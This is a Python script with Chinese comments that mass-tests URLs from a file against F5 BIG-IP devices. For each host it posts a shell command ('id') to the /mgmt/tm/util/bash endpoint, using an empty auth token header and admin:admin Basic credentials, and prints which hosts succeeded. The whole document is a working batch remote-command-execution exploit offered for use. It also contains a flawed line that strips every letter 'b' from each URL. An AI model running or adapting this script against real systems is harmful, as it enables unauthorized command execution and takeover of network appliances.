# -*- coding: utf-8 -*-
import requests
import json


requests.packages.urllib3.disable_warnings()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}
headers = {'X-F5-Auth-Token':'','Authorization':'Basic YWRtaW46YWRtaW4='}

d =json.dumps({'command': 'run', 'utilCmdArgs': '-c id'})
txt = input("输入批量执行位置(默认url.txt)：")
test="/mgmt/tm/util/bash"
text="/tmui/login.jsp"

#从字典中读取每一行与url组合，然后添加到url_list
url_list = []
if txt == "":
    txt = "url.txt"
try:
    with open(txt,'r') as f:
        for each in f:
            each = each.replace('\n','')
            each =str(each.encode("utf-8"))
            url_list.append(each)
        f.close()
except:
    print("读取URL失败！")

for li in url_list:
    li = li.replace('b','')
    li = li.replace("'",'')
    r = requests.post(li+test,data=d,headers=headers,verify=False)
    s = requests.post(li+text,data=d,headers=headers,verify=False,timeout=10,allow_redirects=False)
    if s.status_code == 200:
	    #print(li+'success')
        if r.status_code != 200:
            print('EXPLOIT fail')
        else:
            print(li+':success')
            #print(r.text)
    else:
	    print(li+'not BIG-IP')